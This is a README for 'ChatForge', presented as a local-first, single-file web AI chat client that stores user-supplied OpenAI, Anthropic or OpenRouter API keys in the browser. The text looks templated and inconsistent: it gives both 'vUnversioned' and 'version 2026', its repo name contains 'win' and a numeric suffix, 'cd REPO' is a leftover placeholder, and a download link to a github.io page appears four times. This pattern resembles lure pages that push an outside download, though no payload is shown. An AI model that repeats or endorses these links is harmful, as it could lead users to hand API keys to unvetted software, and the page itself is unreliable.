# ChatForge vUnversioned - AI Chat Client 2026

> **ChatForge is a local-first web AI chat client that connects directly to OpenAI, Anthropic, or OpenRouter with your own API key, presented as a single-file application for version 2026.**

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Unversioned-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/henrykeller1/chatforge-win-31351?style=flat-square)](https://github.com/henrykeller1/chatforge-win-31351)

---

<p align="center">
  <a href="https://henrykeller1.github.io/chatforge-win-31351/">
    <img src="https://img.shields.io/badge/Download-ChatForge%20Latest-brightgreen?style=for-the-badge" alt="Download ChatForge">
  </a>
</p>

> **[Direct Download - ChatForge latest build](https://henrykeller1.github.io/chatforge-win-31351/)**

---

[Download Latest Build](https://henrykeller1.github.io/chatforge-win-31351/)

---

## About ChatForge

ChatForge is a browser-based AI chat client designed for local-first use. It provides a focused interface for working with large language models through OpenAI, Anthropic, and OpenRouter connections while letting users supply their own provider credentials.

The application is delivered as a single HTML file with no external dependency installation required. Conversation history, system prompts, streaming replies, bilingual interface options, and a dark theme make it suitable for everyday chat as well as developer-oriented experimentation.

---

## Features

- Local-first architecture for browser-based use
- Single-file HTML application
- Zero-dependency setup
- Bring-your-own-key support for supported providers
- Direct connections to OpenAI, Anthropic, and OpenRouter
- Streaming responses delivered through Server-Sent Events
- OpenAI and Anthropic protocol parsing
- Conversation history and configurable system prompts
- Bilingual interface
- Dark theme
- Browser-local storage for saved settings and conversations

---

## Installation

### Download

1. Open the [latest ChatForge build](https://henrykeller1.github.io/chatforge-win-31351/).
2. Download the provided HTML application.
3. Open the file in a modern web browser.

### Clone the repository

```bash
git clone https://github.com/henrykeller1/chatforge-win-31351.git
cd REPO
```

After cloning, open the ChatForge HTML file directly in your browser. No package manager or dependency installation is required.

---

## Usage

1. Launch the downloaded or cloned HTML file in a browser.
2. Select the provider you want to use.
3. Enter the corresponding API key through the application settings.
4. Choose a model supported by that provider.
5. Start a conversation and send a prompt.
6. Use the system prompt field to define the behavior or context for a chat.
7. Return to saved conversations through the local conversation history.

ChatForge can be used with OpenAI-compatible services through the supported provider connections, including OpenRouter.

---

## Configuration

ChatForge keeps application settings and conversation data in local browser storage. Configuration is performed from within the interface rather than through a separate configuration file.

Typical settings include:

- Provider selection
- API key
- Model selection
- System prompt
- Interface language
- Theme preference

API keys and stored conversations are associated with the browser profile where ChatForge is used. Clear or manage browser site data to remove locally stored application data.

---

## Requirements

- A modern web browser with JavaScript enabled
- Access to the ChatForge HTML file
- An API key for the selected AI provider
- Network access when communicating with a provider
- Local browser storage enabled for saved history and settings

ChatForge itself does not require a runtime, package manager, server process, or dependency installation.

---

## FAQ

### Which providers are supported?

ChatForge supports direct connections for OpenAI, Anthropic, and OpenRouter.

### Do I need to create a project environment?

No. The application is provided as a single HTML file and has no dependency installation step.

### Where are settings and conversations stored?

ChatForge uses local browser storage for application settings and conversation history.

### Can I use my own API key?

Yes. ChatForge follows a BYOK workflow, allowing you to enter the API key for the provider you select.

### Why is a response not appearing?

Check that the selected provider, model, and API key are configured correctly. Also verify that the browser has network access and that the provider connection is available.

### How do I update ChatForge?

Download the latest build from the project link and replace the older HTML file. Locally stored browser data may remain available depending on the browser storage context.

### Does ChatForge require an installed backend?

No. The application is designed to run from its single-file HTML interface without a separate backend or dependency setup.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
